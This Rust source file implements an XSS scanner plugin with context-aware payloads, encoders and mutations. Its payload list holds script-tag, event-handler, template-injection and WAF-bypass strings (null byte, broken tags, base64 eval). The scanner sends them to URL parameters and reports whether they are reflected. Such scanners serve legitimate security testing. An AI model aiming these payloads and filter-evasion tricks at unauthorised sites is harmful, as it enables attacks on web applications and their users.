use crate::plugin::{ScannerPlugin, Target, ScanResult, Vulnerability, Severity};
use async_trait::async_trait;
use std::fmt::Debug;
use anyhow::Result;
use reqwest::Client;
use url::Url;
use serde_json::json;
use std::collections::{HashMap, HashSet};
use regex::Regex;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use markup5ever_rcdom::{Handle, NodeData, RcDom};
use html5ever::parse_document;
use html5ever::tendril::TendrilSink;
use std::any::Any;

#[derive(Debug, Clone, Eq, Hash, PartialEq)]
pub struct XssPayload {
    payload: String,
    context: InjectionContext,
    encoding: PayloadEncoding,
    description: String,
    mutation: PayloadMutation,
    waf_bypass: bool,
}

#[derive(Debug, Clone, Eq, Hash, PartialEq)]
pub enum InjectionContext {
    HtmlBody,
    HtmlAttribute,
    HtmlTag,
    JavaScript,
    Url,
    Css,
    Dom,
    Template,
    Unknown,
}

#[derive(Debug, Clone, Eq, Hash, PartialEq)]
pub enum PayloadEncoding {
    None,
    HtmlEntity,
    Url,
    DoubleUrl,
    JavaScript,
    Mixed,
    Base64,
    Unicode,
    Hex,
    Octal,
    Binary,
}

#[derive(Debug, Clone, Eq, Hash, PartialEq)]
pub enum PayloadMutation {
    None,
    BrokenTag,
    NullByte,
    JsTricks,
    Mixed,
    UnicodeEscape,
    HtmlEntities,
    Base64Encode,
    HexEncode,
    OctalEncode,
    BinaryEncode,
}

/// XSS scanner plugin that tests for reflected XSS vulnerabilities
#[derive(Debug, Clone)]
pub struct XssScanner {
    client: Client,
    payloads: Vec<XssPayload>,
    delete_all_params: bool,
    custom_input: Option<String>,
    safe_mode: bool,
    waf_detected: bool,
    context_patterns: HashMap<InjectionContext, Vec<Regex>>,
    test_string: String,
    headless_browser: bool,
    stored_xss_check: bool,
    visited_urls: HashSet<String>,
    stored_payloads: HashMap<String, Vec<String>>,
    proxy: Option<String>,
}

impl XssScanner {
    pub fn new() -> Self {
        let mut scanner = Self {
            client: Client::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap(),
            payloads: Vec::new(),
            delete_all_params: false,
            custom_input: None,
            safe_mode: true,
            waf_detected: false,
            context_patterns: HashMap::new(),
            test_string: "dalfox_test".to_string(),
            headless_browser: false,
            stored_xss_check: false,
            visited_urls: HashSet::new(),
            stored_payloads: HashMap::new(),
            proxy: None,
        };
        
        scanner.init_payloads();
        scanner.init_context_patterns();
        scanner
    }

    fn init_payloads(&mut self) {
        // Basic HTML/script tags
        self.payloads.extend(vec![
            XssPayload {
                payload: "<script>alert(1)</script>".to_string(),
                context: InjectionContext::HtmlBody,
                encoding: PayloadEncoding::None,
                description: "Basic script tag injection".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
            XssPayload {
                payload: "<img src=x onerror=alert(1)>".to_string(),
                context: InjectionContext::HtmlTag,
                encoding: PayloadEncoding::None,
                description: "Event handler injection".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
        ]);

        // Event handlers with mutations
        self.payloads.extend(vec![
            XssPayload {
                payload: "<svg/onload=alert(1)>".to_string(),
                context: InjectionContext::HtmlTag,
                encoding: PayloadEncoding::None,
                description: "SVG event handler".to_string(),
                mutation: PayloadMutation::BrokenTag,
                waf_bypass: true,
            },
            XssPayload {
                payload: "<body onload=alert(1)>".to_string(),
                context: InjectionContext::HtmlTag,
                encoding: PayloadEncoding::None,
                description: "Body event handler".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
        ]);

        // JavaScript context payloads
        self.payloads.extend(vec![
            XssPayload {
                payload: "';alert(1);//".to_string(),
                context: InjectionContext::JavaScript,
                encoding: PayloadEncoding::None,
                description: "JavaScript string break".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
            XssPayload {
                payload: "\";alert(1);//".to_string(),
                context: InjectionContext::JavaScript,
                encoding: PayloadEncoding::None,
                description: "JavaScript double quote break".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
        ]);

        // DOM-based payloads
        self.payloads.extend(vec![
            XssPayload {
                payload: "javascript:alert(1)".to_string(),
                context: InjectionContext::Dom,
                encoding: PayloadEncoding::None,
                description: "JavaScript protocol".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
            XssPayload {
                payload: "data:text/html,<script>alert(1)</script>".to_string(),
                context: InjectionContext::Dom,
                encoding: PayloadEncoding::None,
                description: "Data URI".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
        ]);

        // Template injection payloads
        self.payloads.extend(vec![
            XssPayload {
                payload: "${alert(1)}".to_string(),
                context: InjectionContext::Template,
                encoding: PayloadEncoding::None,
                description: "Template literal injection".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
            XssPayload {
                payload: "<%= alert(1) %>".to_string(),
                context: InjectionContext::Template,
                encoding: PayloadEncoding::None,
                description: "ERB template injection".to_string(),
                mutation: PayloadMutation::None,
                waf_bypass: false,
            },
        ]);

        // WAF bypass payloads
        self.payloads.extend(vec![
            XssPayload {
                payload: "<scr\x00ipt>alert(1)</script>".to_string(),
                context: InjectionContext::HtmlBody,
                encoding: PayloadEncoding::None,
                description: "Null byte injection".to_string(),
                mutation: PayloadMutation::NullByte,
                waf_bypass: true,
            },
            XssPayload {
                payload: "<scr<script>ipt>alert(1)</script>".to_string(),
                context: InjectionContext::HtmlBody,
                encoding: PayloadEncoding::None,
                description: "Broken tag injection".to_string(),
                mutation: PayloadMutation::BrokenTag,
                waf_bypass: true,
            },
            XssPayload {
                payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>".to_string(),
                context: InjectionContext::HtmlTag,
                encoding: PayloadEncoding::HtmlEntity,
                description: "HTML entity encoded event handler".to_string(),
                mutation: PayloadMutation::HtmlEntities,
                waf_bypass: true,
            },
            XssPayload {
                payload: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),
                context: InjectionContext::HtmlTag,
                encoding: PayloadEncoding::Base64,
                description: "Base64 encoded JavaScript".to_string(),
                mutation: PayloadMutation::Base64Encode,
                waf_bypass: true,
            },
        ]);
    }

    fn init_context_patterns(&mut self) {
        self.context_patterns.insert(
            InjectionContext::HtmlBody,
            vec![
                Regex::new(r#"<body[^>]*>.*?</body>"#).unwrap(),
                Regex::new(r#"<div[^>]*>.*?</div>"#).unwrap(),
                Regex::new(r#"<p[^>]*>.*?</p>"#).unwrap(),
            ],
        );

        self.context_patterns.insert(
            InjectionContext::HtmlAttribute,
            vec![
                Regex::new(r#"<[^>]+\s+[^>]*=["'][^"']*["'][^>]*>"#).unwrap(),
                Regex::new(r#"<[^>]+\s+[^>]*=[^"'\s>]+[^>]*>"#).unwrap(),
            ],
        );

        self.context_patterns.insert(
            InjectionContext::JavaScript,
            vec![
                Regex::new(r#"<script[^>]*>.*?</script>"#).unwrap(),
                Regex::new(r#"javascript:"#).unwrap(),
                Regex::new(r#"on\w+\s*="#).unwrap(),
                Regex::new(r#"eval\s*\("#).unwrap(),
                Regex::new(r#"setTimeout\s*\("#).unwrap(),
                Regex::new(r#"setInterval\s*\("#).unwrap(),
            ],
        );

        self.context_patterns.insert(
            InjectionContext::Dom,
            vec![
                Regex::new(r#"document\.write\s*\("#).unwrap(),
                Regex::new(r#"innerHTML\s*="#).unwrap(),
                Regex::new(r#"eval\s*\("#).unwrap(),
                Regex::new(r#"location\s*="#).unwrap(),
                Regex::new(r#"window\.location\s*="#).unwrap(),
            ],
        );

        self.context_patterns.insert(
            InjectionContext::Template,
            vec![
                Regex::new(r#"\$\{.*?\}"#).unwrap(),
                Regex::new(r#"<%=.*?%>"#).unwrap(),
                Regex::new(r#"\{\{.*?\}\}"#).unwrap(),
            ],
        );
    }

    fn parse_html(&self, html: &str) -> RcDom {
        let dom = RcDom::default();
        parse_document(dom, Default::default())
            .from_utf8()
            .read_from(&mut html.as_bytes())
            .unwrap_or_else(|_| RcDom::default())
    }

    fn find_reflection_position(&self, dom: &RcDom, test_string: &str) -> Option<usize> {
        fn search_node(handle: &Handle, test_string: &str) -> Option<usize> {
            let node = handle;
            match node.data {
                NodeData::Text { ref contents } => {
                    let text = contents.borrow();
                    if let Some(pos) = text.find(test_string) {
                        return Some(pos);
                    }
                }
                NodeData::Element { ref attrs, .. } => {
                    let attrs = attrs.borrow();
                    for attr in attrs.iter() {
                        if let Some(pos) = attr.value.find(test_string) {
                            return Some(pos);
                        }
                    }
                }
                _ => {}
            }

            for child in node.children.borrow().iter() {
                if let Some(pos) = search_node(child, test_string) {
                    return Some(pos);
                }
            }
            None
        }

        search_node(&dom.document, test_string)
    }

    fn detect_context(&self, dom: &RcDom, position: usize) -> InjectionContext {
        fn find_context(handle: &Handle, position: usize) -> Option<InjectionContext> {
            let node = handle;
            match node.data {
                NodeData::Element { ref name, .. } => {
                    let tag_name = name.local.as_ref();
                    match tag_name {
                        "script" => return Some(InjectionContext::JavaScript),
                        "style" => return Some(InjectionContext::Css),
                        "a" => return Some(InjectionContext::Url),
                        _ => {}
                    }
                }
                NodeData::Text { ref contents } => {
                    let text = contents.borrow();
                    if text.contains("document.write") || text.contains("innerHTML") {
                        return Some(InjectionContext::Dom);
                    }
                }
                _ => {}
            }

            for child in node.children.borrow().iter() {
                if let Some(context) = find_context(child, position) {
                    return Some(context);
                }
            }
            None
        }

        find_context(&dom.document, position).unwrap_or(InjectionContext::Unknown)
    }

    fn encode_payload(&self, payload: &str, encoding: &PayloadEncoding) -> String {
        match encoding {
            PayloadEncoding::None => payload.to_string(),
            PayloadEncoding::HtmlEntity => {
                payload.chars()
                    .map(|c| format!("&#x{:X};", c as u32))
                    .collect()
            },
            PayloadEncoding::Url => {
                utf8_percent_encode(payload, NON_ALPHANUMERIC).to_string()
            },
            PayloadEncoding::DoubleUrl => {
                let first_encode = utf8_percent_encode(payload, NON_ALPHANUMERIC).to_string();
                utf8_percent_encode(&first_encode, NON_ALPHANUMERIC).to_string()
            },
            PayloadEncoding::JavaScript => {
                payload.chars()
                    .map(|c| format!("\\u{:04x}", c as u32))
                    .collect()
            },
            PayloadEncoding::Base64 => {
                BASE64.encode(payload)
            },
            PayloadEncoding::Unicode => {
                payload.chars()
                    .map(|c| format!("\\u{:04x}", c as u32))
                    .collect()
            },
            PayloadEncoding::Hex => {
                payload.chars()
                    .map(|c| format!("\\x{:02x}", c as u32))
                    .collect()
            },
            PayloadEncoding::Octal => {
                payload.chars()
                    .map(|c| format!("\\{:o}", c as u32))
                    .collect()
            },
            PayloadEncoding::Binary => {
                payload.chars()
                    .map(|c| format!("\\b{:b}", c as u32))
                    .collect()
            },
            PayloadEncoding::Mixed => {
                let mut result = String::new();
                for (i, c) in payload.chars().enumerate() {
                    match i % 5 {
                        0 => result.push_str(&format!("&#x{:X};", c as u32)),
                        1 => result.push_str(&utf8_percent_encode(&c.to_string(), NON_ALPHANUMERIC).to_string()),
                        2 => result.push_str(&format!("\\u{:04x}", c as u32)),
                        3 => result.push_str(&format!("\\x{:02x}", c as u32)),
                        _ => result.push(c),
                    }
                }
                result
            },
        }
    }

    fn mutate_payload(&self, payload: &str, mutation: &PayloadMutation) -> String {
        match mutation {
            PayloadMutation::None => payload.to_string(),
            PayloadMutation::BrokenTag => {
                let mut result = String::new();
                for c in payload.chars() {
                    if c == '<' {
                        result.push_str("<scr<script>");
                    } else if c == '>' {
                        result.push_str("</scr</script>>");
                    } else {
                        result.push(c);
                    }
                }
                result
            },
            PayloadMutation::NullByte => {
                payload.replace("<script", "<scr\x00ipt")
                    .replace("</script", "</scr\x00ipt")
            },
            PayloadMutation::JsTricks => {
                payload.replace("alert", "al\u{0065}rt")
                    .replace("eval", "ev\u{0061}l")
            },
            PayloadMutation::UnicodeEscape => {
                payload.chars()
                    .map(|c| format!("\\u{:04x}", c as u32))
                    .collect()
            },
            PayloadMutation::HtmlEntities => {
                payload.chars()
                    .map(|c| format!("&#x{:X};", c as u32))
                    .collect()
            },
            PayloadMutation::Base64Encode => {
                BASE64.encode(payload)
            },
            PayloadMutation::HexEncode => {
                payload.chars()
                    .map(|c| format!("\\x{:02x}", c as u32))
                    .collect()
            },
            PayloadMutation::OctalEncode => {
                payload.chars()
                    .map(|c| format!("\\{:o}", c as u32))
                    .collect()
            },
            PayloadMutation::BinaryEncode => {
                payload.chars()
                    .map(|c| format!("\\b{:b}", c as u32))
                    .collect()
            },
            PayloadMutation::Mixed => {
                let mut result = String::new();
                for (i, c) in payload.chars().enumerate() {
                    match i % 4 {
                        0 => result.push(c),
                        1 => result.push_str(&format!("\\u{:04x}", c as u32)),
                        2 => result.push_str(&format!("&#x{:X};", c as u32)),
                        _ => result.push_str(&format!("\\x{:02x}", c as u32)),
                    }
                }
                result
            },
        }
    }

    async fn test_parameter(&mut self, url: &Url, param_name: &str, payload: &XssPayload) -> Result<Option<Vulnerability>> {
        // First, test for reflection with a harmless string
        let mut test_url = url.clone();
        {
            let mut query_pairs = test_url.query_pairs_mut();
            query_pairs.clear();
            if !self.delete_all_params {
                query_pairs.append_pair(param_name, &self.test_string);
            }
        }

        let reflection_position = match self.client.get(test_url.as_str()).send().await {
            Ok(response) => {
                if let Ok(text) = response.text().await {
                    let dom = self.parse_html(&text);
                    self.find_reflection_position(&dom, &self.test_string)
                } else {
                    None
                }
            }
            Err(_) => None,
        };

        // If no reflection found, skip this parameter
        if reflection_position.is_none() {
            return Ok(None);
        }

        // Now test with the actual payload
        let mut test_url = url.clone();
        {
            let mut query_pairs = test_url.query_pairs_mut();
            query_pairs.clear();
            if !self.delete_all_params {
                let encoded_payload = self.encode_payload(&payload.payload, &payload.encoding);
                let mutated_payload = self.mutate_payload(&encoded_payload, &payload.mutation);
                query_pairs.append_pair(param_name, &mutated_payload);
            }
        }

        match self.client.get(test_url.as_str()).send().await {
            Ok(response) => {
                let content_type = response.headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_lowercase();

                if !content_type.contains("text/html") 
                    && !content_type.contains("application/xhtml+xml")
                    && !content_type.contains("text/xml")
                    && !content_type.contains("application/xml") {
                    return Ok(None);
                }

                if let Ok(text) = response.text().await {
                    if self.detect_waf(&text) {
                        self.waf_detected = true;
                        return Ok(None);
                    }

                    let dom = self.parse_html(&text);
                    // Verify payload reflection and context
                    if let Some(pos) = reflection_position {
                        let context = self.detect_context(&dom, pos);
                        if self.verify_reflection(&text, &payload) {
                            // Store payload for stored XSS check
                            if self.stored_xss_check {
                                self.stored_payloads.entry(url.to_string())
                                    .or_insert_with(Vec::new)
                                    .push(payload.payload.clone());
                            }

                            return Ok(Some(Vulnerability {
                                name: "Reflected XSS".to_string(),
                                description: format!(
                                    "Parameter '{}' appears to be vulnerable to reflected XSS ({}) in {:?} context",
                                    param_name,
                                    payload.description,
                                    context
                                ),
                                severity: Severity::High,
                                cve_id: None,
                                metadata: json!({
                                    "url": test_url.to_string(),
                                    "parameter": param_name,
                                    "payload": payload.payload,
                                    "context": format!("{:?}", context),
                                    "encoding": format!("{:?}", payload.encoding),
                                    "mutation": format!("{:?}", payload.mutation),
                                    "content_type": content_type,
                                    "reflection_position": pos,
                                    "waf_bypass": payload.waf_bypass,
                                }),
                            }));
                        }
                    }
                }
            }
            Err(e) => {
                tracing::warn!("Failed to test URL {}: {}", test_url, e);
            }
        }
        Ok(None)
    }

    fn detect_waf(&self, response: &str) -> bool {
        // Common WAF detection patterns
        let waf_patterns = vec![
            "blocked by security policy",
            "security violation",
            "forbidden",
            "mod_security",
            "cloudflare",
            "akamai",
            "incapsula",
        ];

        waf_patterns.iter().any(|pattern| response.to_lowercase().contains(pattern))
    }

    fn verify_reflection(&self, response: &str, payload: &XssPayload) -> bool {
        // Basic reflection check
        if response.contains(&payload.payload) {
            return true;
        }

        // Check for encoded reflection
        let encoded = self.encode_payload(&payload.payload, &payload.encoding);
        if response.contains(&encoded) {
            return true;
        }

        // Check for partial reflection
        let words: Vec<&str> = payload.payload.split_whitespace().collect();
        if words.iter().all(|word| response.contains(word)) {
            return true;
        }

        false
    }

    async fn check_stored_xss(&self, url: &Url) -> Result<Vec<Vulnerability>> {
        let mut vulnerabilities = Vec::new();
        
        if let Some(payloads) = self.stored_payloads.get(&url.to_string()) {
            for payload in payloads {
                let response = self.client.get(url.as_str()).send().await?;
                if let Ok(text) = response.text().await {
                    if text.contains(payload) {
                        vulnerabilities.push(Vulnerability {
                            name: "Stored XSS".to_string(),
                            description: format!(
                                "Stored XSS payload found in response: {}",
                                payload
                            ),
                            severity: Severity::High,
                            cve_id: None,
                            metadata: json!({
                                "url": url.to_string(),
                                "payload": payload,
                                "type": "stored",
                            }),
                        });
                    }
                }
            }
        }
        
        Ok(vulnerabilities)
    }

    pub fn with_delete_all_params(mut self, delete_all_params: bool) -> Self {
        self.delete_all_params = delete_all_params;
        self
    }

    pub fn with_custom_input(mut self, custom_input: Option<String>) -> Self {
        self.custom_input = custom_input;
        self
    }

    pub fn with_safe_mode(mut self, safe_mode: bool) -> Self {
        self.safe_mode = safe_mode;
        self
    }

    pub fn with_headless_browser(mut self, enabled: bool) -> Self {
        self.headless_browser = enabled;
        self
    }

    pub fn with_stored_xss_check(mut self, enabled: bool) -> Self {
        self.stored_xss_check = enabled;
        self
    }

    pub fn with_proxy(mut self, proxy: Option<String>) -> Self {
        if let Some(proxy_url) = proxy {
            self.proxy = Some(proxy_url.clone());
            let mut builder = Client::builder()
                .danger_accept_invalid_certs(true);
            
            // Configure HTTP proxy
            if let Ok(http_proxy) = reqwest::Proxy::http(&proxy_url) {
                builder = builder.proxy(http_proxy);
            } else {
                tracing::warn!("Failed to set HTTP proxy");
            }
            
            // Configure HTTPS proxy
            if let Ok(https_proxy) = reqwest::Proxy::https(&proxy_url) {
                builder = builder.proxy(https_proxy);
            } else {
                tracing::warn!("Failed to set HTTPS proxy");
            }
            
            self.client = builder.build().unwrap_or_else(|_| {
                tracing::warn!("Failed to build client with proxy, falling back to default client");
                Client::builder()
                    .danger_accept_invalid_certs(true)
                    .build()
                    .unwrap()
            });
        }
        self
    }
}

#[async_trait]
impl ScannerPlugin for XssScanner {
    fn name(&self) -> &'static str {
        "xss_scanner"
    }

    fn description(&self) -> &'static str {
        "Advanced XSS scanner with context-aware payloads and WAF detection"
    }

    fn version(&self) -> &'static str {
        "0.2.0"
    }

    async fn validate(&self, target: &Target) -> Result<bool> {
        match target.target_type {
            crate::plugin::TargetType::Url => Ok(true),
            _ => Ok(false),
        }
    }

    async fn scan(&mut self, target: &Target) -> Result<ScanResult> {
        let url = Url::parse(&target.raw)?;
        let mut vulnerabilities = Vec::new();
        let mut seen_vulns = HashSet::new();

        if let Some(discovered_urls) = target.metadata.get("discovered_urls") {
            if let Some(urls) = discovered_urls.as_array() {
                for url_data in urls {
                    if let Ok(discovered_url) = serde_json::from_value::<crate::core::crawler::DiscoveredUrl>(url_data.clone()) {
                        for param in &discovered_url.parameters {
                            // Create a unique key for this parameter and endpoint
                            let vuln_key = format!("{}:{}", discovered_url.url, param.name);
                            
                            // Skip if we've already found a vulnerability for this parameter
                            if seen_vulns.contains(&vuln_key) {
                                continue;
                            }

                            let payloads = if let Some(input) = &self.custom_input {
                                vec![XssPayload {
                                    payload: input.clone(),
                                    context: InjectionContext::Unknown,
                                    encoding: PayloadEncoding::None,
                                    description: "Custom input".to_string(),
                                    mutation: PayloadMutation::None,
                                    waf_bypass: false,
                                }]
                            } else {
                                self.payloads.clone()
                            };

                            for payload in &payloads {
                                if let Some(vuln) = self.test_parameter(&discovered_url.url, &param.name, payload).await? {
                                    seen_vulns.insert(vuln_key);
                                    vulnerabilities.push(vuln);
                                    break; // Stop testing this parameter once we find a vulnerability
                                }
                            }
                        }
                    }
                }
            }
        } else {
            let response = self.client.get(url.as_str()).send().await?;
            let _text = response.text().await?;
            
            for (name, _value) in url.query_pairs() {
                // Create a unique key for this parameter and endpoint
                let vuln_key = format!("{}:{}", url, name);
                
                // Skip if we've already found a vulnerability for this parameter
                if seen_vulns.contains(&vuln_key) {
                    continue;
                }

                let payloads = if let Some(input) = &self.custom_input {
                    vec![XssPayload {
                        payload: input.clone(),
                        context: InjectionContext::Unknown,
                        encoding: PayloadEncoding::None,
                        description: "Custom input".to_string(),
                        mutation: PayloadMutation::None,
                        waf_bypass: false,
                    }]
                } else {
                    self.payloads.clone()
                };

                for payload in &payloads {
                    if let Some(vuln) = self.test_parameter(&url, &name, payload).await? {
                        seen_vulns.insert(vuln_key);
                        vulnerabilities.push(vuln);
                        break; // Stop testing this parameter once we find a vulnerability
                    }
                }
            }
        }

        Ok(ScanResult {
            plugin_name: self.name().to_string(),
            success: true,
            vulnerabilities,
            metadata: json!({
                "scanned_urls": target.metadata.get("discovered_urls").cloned(),
                "waf_detected": self.waf_detected,
                "safe_mode": self.safe_mode,
                "unique_vulnerabilities": seen_vulns.len(),
            }),
        })
    }

    fn box_clone(&self) -> Box<dyn ScannerPlugin + Send + Sync> {
        Box::new(Self::new())
    }

    fn as_any(&self) -> &dyn Any {
        self
    }
} 